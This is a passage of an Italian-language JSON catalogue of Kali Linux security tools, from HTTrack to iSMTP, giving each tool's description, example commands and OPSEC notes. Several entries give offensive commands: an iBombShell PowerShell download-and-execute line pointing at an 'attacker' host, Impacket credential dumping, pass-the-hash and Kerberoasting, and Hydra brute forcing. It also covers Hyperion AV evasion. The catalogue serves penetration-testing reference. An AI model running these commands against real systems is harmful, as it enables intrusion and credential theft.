    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>HTTrack è un website copier che scarica interi siti web per visualizzazione offline. Mantiene la struttura originale dei link, converte URL assoluti in relativi, e gestisce JavaScript e CSS. Utile per analisi offline di siti target o preservazione di evidence.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Mirror completo:</strong> Download ricorsivo di tutte le risorse.</p><p><strong>Link rewriting:</strong> Conversione per navigazione offline.</p><p><strong>Filtri:</strong> Include/escludi per estensione, path, dimensione.</p><p><strong>Resume:</strong> Riprende download interrotti.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Mirror semplice\nhttrack https://target.com -O ./output\n\n# Con profondità limitata\nhttrack https://target.com -O ./mirror -r3\n\n# Solo HTML e immagini\nhttrack https://target.com +*.html +*.jpg +*.png -r\n\n# GUI\nwebhttrack</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Evidence Collection</strong>, preserva stato del sito prima di modifiche. <strong>Offline Analysis</strong> di contenuti web. Nel <strong>Pentesting</strong>, analisi di struttura e contenuti senza traffico continuo.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Active:</strong> Alto traffico durante download. User-agent identificabile. Può attivare rate limiting o ban. Rispetta robots.txt di default.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Web",
      "Crawling",
      "Active"
    ],
    "notes": null
  },
  {
    "id": "humble",
    "name": "humble",
    "version": "1.52",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/humble/",
    "desc": "Analizza header HTTP per trovare misconfiguration e security header mancanti.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Humble è un analizzatore di HTTP security header. Verifica la presenza e configurazione corretta di header come CSP, HSTS, X-Frame-Options, X-Content-Type-Options e altri. Fornisce raccomandazioni basate su best practice di sicurezza web.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Header Analysis:</strong> Verifica tutti i security header comuni.</p><p><strong>Scoring:</strong> Valutazione della postura di sicurezza.</p><p><strong>Recommendations:</strong> Suggerimenti per miglioramenti.</p><p><strong>Export:</strong> Report in vari formati.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Analisi base\nhumble https://target.com\n\n# Output dettagliato\nhumble -u https://target.com -v\n\n# Lista di URL\nhumble -l urls.txt\n\n# Export JSON\nhumble -u https://target.com -o json</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nel <strong>Web Assessment</strong>, verifica configurazione header di sicurezza. Per <strong>Compliance</strong>, audit di configurazioni richieste. <strong>Bug Bounty</strong> per trovare misconfiguration sfruttabili.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Passive:</strong> Solo richieste HTTP HEAD/GET standard. Minimo footprint. Non invasivo, simile a traffico browser normale.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Fingerprinting",
      "HTTP_Analysis"
    ],
    "notes": null
  },
  {
    "id": "hrepo",
    "name": "hrepo",
    "version": "2.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/hrepo/",
    "desc": "Enumera repository Git esposti pubblicamente su server web per leak di codice sorgente.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>HRepo è un tool per scoprire e analizzare repository Git esposti pubblicamente su server web. Cerca directory .git accessibili che possono contenere codice sorgente, credenziali, configurazioni e cronologia dei commit. Un errore di deployment comune e grave.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Git Detection:</strong> Trova .git directory esposte.</p><p><strong>Repository Dump:</strong> Scarica contenuti esposti.</p><p><strong>History Extraction:</strong> Recupera commit e file cancellati.</p><p><strong>Secrets Search:</strong> Analizza per credenziali nel repo.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Check singolo target\nhrepo -u https://target.com\n\n# Lista di target\nhrepo -l urls.txt\n\n# Con dump del repository\nhrepo -u https://target.com --dump\n\n# Analisi automatica secrets\nhrepo -u https://target.com --secrets</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Bug Bounty</strong>, trova source code disclosure. Nel <strong>Pentesting</strong>, accede a credenziali in repo esposti. <strong>OSINT</strong> per analisi di codice e configurazioni target.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Active:</strong> Richieste HTTP a path specifici (.git/). Pattern riconoscibile. I download generano traffico significativo.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence"
    ],
    "notes": null
  },
  {
    "id": "hydra-kali",
    "name": "hydra",
    "version": "9.5",
    "icon": "../app/icons/hydra-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/hydra/",
    "desc": "Brute forcer veloce e parallelo per 50+ protocolli: SSH, FTP, HTTP, RDP, SMB, MySQL.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Hydra (THC Hydra) è il password cracker online più completo e veloce. Supporta oltre 50 protocolli tra cui SSH, FTP, HTTP, RDP, SMB, MySQL, MSSQL, PostgreSQL, LDAP, VNC e molti altri. Utilizza attacchi dizionario con threading parallelo per massimizzare la velocità.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-protocol:</strong> 50+ protocolli supportati.</p><p><strong>Parallelismo:</strong> Thread multipli per velocità.</p><p><strong>Flexible:</strong> Username e password da file o singoli.</p><p><strong>Resume:</strong> Riprende sessioni interrotte.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># SSH brute force\nhydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target.com\n\n# HTTP POST form\nhydra -l admin -P pass.txt target.com http-post-form \"/login:user=^USER^&pass=^PASS^:F=failed\"\n\n# RDP con lista utenti\nhydra -L users.txt -P passwords.txt rdp://target.com\n\n# SMB\nhydra -L users.txt -P pass.txt smb://target.com</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nel <strong>Pentesting</strong>, test di password policy e weak credentials. Per <strong>CTF</strong>, cracking di servizi esposti. <strong>Security Audit</strong> di compliance password.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Molto Rumoroso:</strong> Migliaia di tentativi di login. Facilmente rilevabile da IDS/SIEM. Causa lockout account. Usare rate limiting (-t, -W).</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Brute_Force"
    ],
    "notes": null
  },
  {
    "id": "hyperion",
    "name": "hyperion",
    "version": "2.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/hyperion/",
    "desc": "Runtime encrypter per PE files Windows che bypassa AV con encryption AES.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Hyperion è un runtime crypter per eseguibili Windows PE. Cripta il payload con AES e genera un wrapper che decripta in memoria a runtime. Utilizzato per AV evasion, rendendo le signature statiche inefficaci contro il payload criptato.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>AES Encryption:</strong> Crittografia del PE originale.</p><p><strong>Runtime Decrypt:</strong> Decrittazione in memoria.</p><p><strong>Stub Generation:</strong> Wrapper eseguibile auto-decrittante.</p><p><strong>PE Support:</strong> Supporta vari formati PE.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Cripta un eseguibile\nwine hyperion.exe payload.exe crypted.exe\n\n# Da Linux con Wine\nwine /usr/share/windows-resources/hyperion/hyperion.exe input.exe output.exe\n\n# Verifica output\nfile crypted.exe</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nel <strong>Red Team</strong>, evasione di AV signature-based. Per <strong>Payload Delivery</strong>, consegna di malware custom. <strong>AV Testing</strong> per verificare detection capabilities.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>AV Evasion:</strong> Hyperion stesso è flaggato da molti AV. Detection comportamentale può comunque rilevare il payload. Output detectabile se stub è noto.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "04_Red_Team",
      "Evasion"
    ],
    "notes": null
  },
  {
    "id": "ibombshell",
    "name": "ibombshell",
    "version": "0~git20201107",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/ibombshell/",
    "desc": "Post-exploitation tool con PowerShell e Python per operazioni su sistemi compromessi.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>iBombShell è un framework di post-exploitation che opera tramite PowerShell e Python. Fornisce una shell interattiva per operazioni su sistemi compromessi con funzionalità modulari. Può operare in modalità everywhere (fileless) o con console server dedicato.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Fileless:</strong> Modalità everywhere senza file su disco.</p><p><strong>Modular:</strong> Caricamento dinamico di funzioni.</p><p><strong>Cross-platform:</strong> PowerShell e Python.</p><p><strong>C2 Integration:</strong> Console server per controllo.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia console server\npython3 ibombshell.py\n\n# Client PowerShell (everywhere mode)\niex(new-object net.webclient).downloadstring('http://attacker/ibombshell.ps1')\n\n# Comandi nella shell\nload-functions\nget-system\ndump-credentials</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Red Team</strong>, post-exploitation Windows fileless. Nel <strong>Pentesting</strong>, operazioni su sistemi compromessi. <strong>Lateral Movement</strong> con moduli dedicati.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> PowerShell monitoring può rilevare attività. AMSI bypass necessario. Traffic C2 identificabile. Operazioni in memoria comunque loggabili.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Toolkits"
    ],
    "notes": null
  },
  {
    "id": "ident-user-enum",
    "name": "ident-user-enum",
    "version": "1.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/ident-user-enum/",
    "desc": "Enumera username su sistemi che espongono ident service (porta 113) via TCP.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Ident-user-enum enumera username su sistemi che espongono il servizio Ident (RFC 1413) sulla porta 113. Il protocollo Ident restituisce lo username associato a una connessione TCP specifica. Sebbene deprecato, è ancora presente su alcuni sistemi Unix/Linux legacy.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>User Enumeration:</strong> Scopre username via Ident.</p><p><strong>Port Correlation:</strong> Associa utenti a porte attive.</p><p><strong>Batch Mode:</strong> Test su multiple porte/host.</p><p><strong>Simple Output:</strong> Lista username trovati.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Enumera utenti su porta specifica\nident-user-enum target.com 22\n\n# Multiple porte\nident-user-enum target.com 22,25,80,110\n\n# Da lista IP\ncat hosts.txt | while read h; do ident-user-enum $h 22; done</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Enumeration</strong>, scopre username per brute force successivo. Nel <strong>Legacy Assessment</strong>, audit di sistemi datati. <strong>Recon</strong> per information gathering.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Passivo:</strong> Query Ident standard. Servizio raramente monitorato. Basso traffico. Richiede che il servizio sia attivo (raro su sistemi moderni).</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Infrastructure",
      "Porta_113"
    ],
    "notes": null
  },
  {
    "id": "ike-scan",
    "name": "ike-scan",
    "version": "1.9.5",
    "icon": "../app/icons/ike-scan-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/ike-scan/",
    "desc": "Scopre e fingerprint gateway VPN IPsec analizzando risposte IKE e transform set.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>IKE-scan scopre e fingerprint gateway VPN IPsec. Invia pacchetti IKE Phase 1 e analizza le risposte per identificare vendor, versione e transform set supportati. Essenziale per assessment di infrastrutture VPN e identificazione di configurazioni deboli.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Discovery:</strong> Trova gateway IKE attivi.</p><p><strong>Fingerprinting:</strong> Identifica vendor e versione.</p><p><strong>Transform Enum:</strong> Lista cipher e hash supportati.</p><p><strong>Aggressive Mode:</strong> Test per leak di informazioni.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan base\nike-scan target.com\n\n# Aggressive mode (rivela più info)\nike-scan -A target.com\n\n# Con transform specifico\nike-scan --trans=5,2,1,2 target.com\n\n# Scan range\nike-scan 192.168.1.0/24</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>VPN Assessment</strong>, identifica gateway e configurazioni. Nel <strong>Pentesting</strong>, trova VPN con configurazioni deboli. <strong>Recon</strong> di infrastruttura perimetrale.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Active:</strong> Pacchetti IKE verso porta 500/UDP. Facilmente loggato da firewall/IDS. Aggressive mode rivela anche il client. Pattern riconoscibile.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "Service_Fingerprinting"
    ],
    "notes": null
  },
  {
    "id": "impacket-scripts",
    "name": "impacket-scripts",
    "version": "1.1",
    "icon": "../app/icons/impacket-scripts-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/impacket-scripts/",
    "desc": "Wrapper e script aggiuntivi per semplificare l'uso degli script Impacket.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Impacket-scripts fornisce wrapper e script aggiuntivi per semplificare l'utilizzo della libreria Impacket. Include utility per operazioni comuni come autenticazione, esecuzione remota, e manipolazione di protocolli Windows senza dover scrivere codice Python custom.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Wrapper:</strong> Interfacce semplificate per Impacket.</p><p><strong>Common Tasks:</strong> Script per operazioni frequenti.</p><p><strong>Integration:</strong> Facilita pipeline con altri tool.</p><p><strong>Documentation:</strong> Esempi e help integrati.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Gli script wrappano gli originali Impacket\n# Esempi di utilizzo tipico:\n\n# PSExec wrapper\nimpacket-psexec domain/user:password@target\n\n# WMIExec wrapper\nimpacket-wmiexec domain/user:password@target\n\n# SecretsDump wrapper\nimpacket-secretsdump domain/user:password@target</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Pentesting AD</strong>, operazioni rapide senza scripting. Nel <strong>Learning</strong>, approccio semplificato a Impacket. <strong>Automation</strong> in pipeline.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Stesse considerazioni di Impacket:</strong> Traffico SMB/RPC rilevabile. Autenticazione loggata. Esecuzione remota monitorata da EDR. Event log su target.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Toolkits"
    ],
    "notes": null
  },
  {
    "id": "impacket",
    "name": "impacket",
    "version": "0.12.0",
    "icon": "../app/icons/impacket-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/impacket/",
    "desc": "Libreria Python per protocolli di rete Windows: SMB, MSRPC, NTLM, Kerberos, WMI.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Impacket è LA libreria Python per lavorare con protocolli di rete Windows. Include implementazioni complete di SMB, MSRPC, NTLM, Kerberos, WMI, LDAP e altri. Fornisce script pronti all'uso per attacchi AD comuni: secretsdump, psexec, wmiexec, GetNPUsers, GetUserSPNs e molti altri.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Protocol Suite:</strong> SMB1/2/3, MSRPC, Kerberos, NTLM.</p><p><strong>Ready Scripts:</strong> 50+ script per attacchi AD.</p><p><strong>Credential Attacks:</strong> Pass-the-hash, Kerberoasting, AS-REP roasting.</p><p><strong>Remote Execution:</strong> PSExec, WMIExec, SMBExec, AtExec.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Secretsdump con tutti i metodi (SAM, LSA, NTDS)\nimpacket-secretsdump -just-dc-ntlm domain/admin:password@dc.target.com -outputfile ntds_dump\n\n# DCSync attack per target specifico\nimpacket-secretsdump -just-dc-user krbtgt domain/admin@dc.target.com\n\n# Remote shell via diversi protocolli\nimpacket-psexec domain/admin@target -hashes aad3b:ntlmhash  # SMB\nimpacket-wmiexec domain/admin@target -hashes aad3b:ntlmhash # WMI (stealthier)\nimpacket-smbexec domain/admin@target -hashes aad3b:ntlmhash # SMB senza service\nimpacket-atexec domain/admin@target -hashes aad3b:ntlmhash \"whoami\" # Task Scheduler\n\n# Kerberoasting con output hashcat\nimpacket-GetUserSPNs domain/user:password -dc-ip 10.10.10.1 -request -outputfile kerberoast.txt\nhashcat -m 13100 kerberoast.txt wordlist.txt\n\n# Silver Ticket attack\nimpacket-ticketer -nthash SERVICE_HASH -domain-sid S-1-5-21-... -domain domain.local -spn MSSQLSvc/sql.domain.local admin\n\n# NTLM relay su LDAP per addComputer\nimpacket-ntlmrelayx -t ldaps://dc.domain.local --add-computer EVIL$ Password123\n\n# Zerologon check e exploit\nimpacket-zerologon dc01 domain.local</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>AD Pentesting</strong>, toolkit essenziale per attacchi. Nel <strong>Red Team</strong>, lateral movement e privilege escalation. <strong>Credential Harvesting</strong> e persistence.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Molto Rilevabile:</strong> Traffico SMB/RPC monitoato da EDR. Event 4624/4625 per login. Secretsdump genera eventi specifici. Signatrue degli script note.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Toolkits"
    ],
    "notes": null
  },
  {
    "id": "inspy",
    "name": "inspy",
    "version": "3.0.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/inspy/",
    "desc": "OSINT LinkedIn per enumerare dipendenti, ruoli e tecnologie usate da un'azienda.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>InSpy è un tool OSINT per enumerazione LinkedIn. Cerca dipendenti di un'azienda target, i loro ruoli, e le tecnologie menzionate nei profili. Utile per costruire liste di username, identificare target per social engineering, e mappare stack tecnologici.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Employee Enum:</strong> Lista dipendenti da LinkedIn.</p><p><strong>Role Discovery:</strong> Identifica posizioni e dipartimenti.</p><p><strong>Tech Stack:</strong> Tecnologie da job posting e profili.</p><p><strong>Username Generation:</strong> Genera possibili username.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Enumera dipendenti\ninspy --empspy --company \"Target Corp\"\n\n# Cerca tecnologie\ninspy --techspy --company \"Target Corp\"\n\n# Output file\ninspy --empspy --company \"Target\" --output employees.txt\n\n# Con wordlist custom per tech\ninspy --techspy --company \"Target\" --wordlist tech.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>OSINT</strong>, mappa struttura aziendale. Nel <strong>Social Engineering</strong>, identifica target. <strong>Username Enum</strong> per attacchi successivi. <strong>Tech Recon</strong> per attack surface.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Passivo:</strong> Scraping LinkedIn (possibile ban account). Non contatta il target direttamente. Rate limiting necessario per evitare blocchi.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "People_Search"
    ],
    "notes": null
  },
  {
    "id": "instaloader",
    "name": "instaloader",
    "version": "4.14.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/instaloader/",
    "desc": "Scarica foto, video, storie e metadati da profili Instagram per OSINT social.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Instaloader scarica contenuti da Instagram: foto, video, storie, highlights, IGTV, e metadati associati. Supporta profili pubblici e privati (con login). Essenziale per OSINT social media, preservazione evidence, e analisi di profili target.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Content Download:</strong> Foto, video, storie, reels.</p><p><strong>Metadata:</strong> Caption, timestamp, location, hashtag.</p><p><strong>Private Profiles:</strong> Accesso con credenziali.</p><p><strong>Batch Mode:</strong> Download multipli profili.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Download profilo pubblico\ninstaloader profile targetuser\n\n# Con login per profili privati\ninstaloader --login yourusername profile targetuser\n\n# Solo storie\ninstaloader --stories profile targetuser\n\n# Hashtag\ninstaloader \"#targethashtag\"\n\n# Con metadati JSON\ninstaloader --metadata-json profile targetuser</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>OSINT</strong>, raccolta informazioni su individui. <strong>Evidence Collection</strong> prima che contenuti siano rimossi. <strong>Social Engineering Prep</strong> per costruire pretesti.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Semi-passivo:</strong> Non notifica il target per profili pubblici. Login può essere rilevato. Rate limiting aggressivo da Instagram. IP logging.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Social_Media"
    ],
    "notes": null
  },
  {
    "id": "intrace",
    "name": "intrace",
    "version": "1.6",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/intrace/",
    "desc": "Traceroute che usa connessioni TCP esistenti per bypassare firewall statefull.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>InTrace esegue traceroute utilizzando connessioni TCP esistenti invece di pacchetti ICMP o UDP. Sfrutta il fatto che firewall stateful permettono traffico relativo a connessioni stabilite. Utile per mappare percorsi di rete attraverso firewall che bloccano traceroute tradizionale.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>TCP Traceroute:</strong> Usa connessioni TCP esistenti.</p><p><strong>Firewall Bypass:</strong> Evita filtri ICMP/UDP.</p><p><strong>Stateful Evasion:</strong> Sfrutta connection tracking.</p><p><strong>Path Mapping:</strong> Mappa hop intermedi.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Connetti prima a un servizio, poi lancia intrace\n# Su un terminale:\nnc target.com 80\n\n# Su altro terminale:\nintrace -i eth0 -h target.com\n\n# Specificando interfaccia\nintrace -i eth0 -h target.com -p 443</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Network Recon</strong>, traceroute attraverso firewall. Nel <strong>Pentesting</strong>, mappa infrastruttura protetta. <strong>Troubleshooting</strong> di percorsi bloccati.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Stealth:</strong> Meno visibile di traceroute tradizionale. Richiede connessione TCP esistente. Genera pacchetti anomali (TTL modificati) comunque rilevabili.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "Port_Scanning"
    ],
    "notes": null
  },
  {
    "id": "iodine",
    "name": "iodine",
    "version": "0.7.0",
    "icon": "../app/icons/iodine-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/iodine/",
    "desc": "Tunnel IP over DNS per bypassare captive portal e firewall che permettono query DNS.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Iodine crea tunnel IP-over-DNS per bypassare captive portal, firewall e reti restrittive che permettono solo traffico DNS. Incapsula traffico IP in query/risposte DNS, permettendo accesso internet completo attraverso reti che bloccano tutto tranne DNS.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>IP over DNS:</strong> Tunnel completo via DNS.</p><p><strong>Captive Portal Bypass:</strong> Evita login obbligatori.</p><p><strong>Encoding Options:</strong> Base32, Base64, Base128.</p><p><strong>Auto-probe:</strong> Trova encoding ottimale automaticamente.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Server (su VPS con dominio)\niodined -f -c -P password 10.0.0.1 tunnel.yourdomain.com\n\n# Client\niodine -f -P password tunnel.yourdomain.com\n\n# Verifica tunnel\nping 10.0.0.1\n\n# Route traffico attraverso tunnel\nip route add default via 10.0.0.1</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Network Bypass</strong>, accesso da reti restrittive. Nel <strong>Red Team</strong>, exfiltration via DNS. <strong>Travel/Hotel</strong> per evitare captive portal a pagamento.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detectabile:</strong> Alto volume di query DNS anomale. Payload encoded riconoscibile. DNS monitoring può identificare tunnel. Lento rispetto a VPN standard.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Pivoting"
    ],
    "notes": null
  },
  {
    "id": "ipv6toolkit",
    "name": "ipv6toolkit",
    "version": "2.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/ipv6toolkit/",
    "desc": "Suite di tool per security assessment di reti IPv6: scanning, spoofing, MITM.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>IPv6 Toolkit è una suite completa per security assessment di reti IPv6. Include strumenti per scanning, spoofing, MITM, e attacchi specifici IPv6 come Router Advertisement spoofing, Neighbor Discovery attacks, e fragmentation attacks. Molte reti hanno IPv6 abilitato ma non monitorato.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Scanning:</strong> Discovery host e servizi IPv6.</p><p><strong>RA Spoofing:</strong> Router Advertisement injection.</p><p><strong>ND Attacks:</strong> Neighbor Discovery manipulation.</p><p><strong>Fragmentation:</strong> Evasion via frammentazione.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan network locale IPv6\nscan6 -i eth0 -L -e\n\n# Router Advertisement flood\nra6 -i eth0 -F\n\n# Neighbor spoofing\nna6 -i eth0 -T target -E attacker_mac\n\n# TCP scan IPv6\nscan6 -i eth0 -d target::1 -p 22,80,443</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Network Assessment</strong>, test sicurezza IPv6 spesso trascurata. Nel <strong>Pentesting</strong>, MITM su reti dual-stack. <strong>Red Team</strong> per bypass di controlli solo IPv4.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rumoroso:</strong> RA spoofing molto visibile. Può causare DoS involontario. IPv6 monitoring meno comune ma presente in ambienti maturi.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Network_Sniffing"
    ],
    "notes": null
  },
  {
    "id": "irpas",
    "name": "irpas",
    "version": "0.10",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/irpas/",
    "desc": "Suite per attacchi su protocolli di routing: CDP, HSRP, IGRP, IRDP spoofing.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>IRPAS (Internet Routing Protocol Attack Suite) è una raccolta di tool per attacchi su protocolli di routing e discovery di rete. Include strumenti per CDP (Cisco Discovery Protocol), HSRP, IGRP, IRDP spoofing. Permette MITM e redirezione del traffico a livello di infrastruttura di rete.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>CDP Spoofing:</strong> Impersona dispositivi Cisco.</p><p><strong>HSRP Attack:</strong> Diventa master router.</p><p><strong>IGRP Injection:</strong> Route injection.</p><p><strong>IRDP Redirect:</strong> Default gateway spoofing.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># CDP flooding\ncdp -i eth0\n\n# HSRP takeover\nhsrp -i eth0 -g 10 -p 100 -v 192.168.1.1\n\n# IRDP redirect\nirdp -i eth0 -S 192.168.1.1\n\n# IGRP route injection\nigrp -i eth0</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Infrastructure Pentesting</strong>, test di sicurezza routing. Nel <strong>Red Team</strong>, MITM a livello rete. <strong>Network Assessment</strong> di segregazione e protezioni.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Molto Rumoroso:</strong> Impatto immediato su infrastruttura. Può causare outage di rete. Monitoraggio SNMP/syslog rileva cambiamenti. Solo in ambienti autorizzati.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Infrastructure",
      "Network"
    ],
    "notes": null
  },
  {
    "id": "ismtp",
    "name": "ismtp",
    "version": "1.6",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/ismtp/",
    "desc": "Testa server SMTP per user enumeration tramite VRFY, EXPN e RCPT TO commands.",
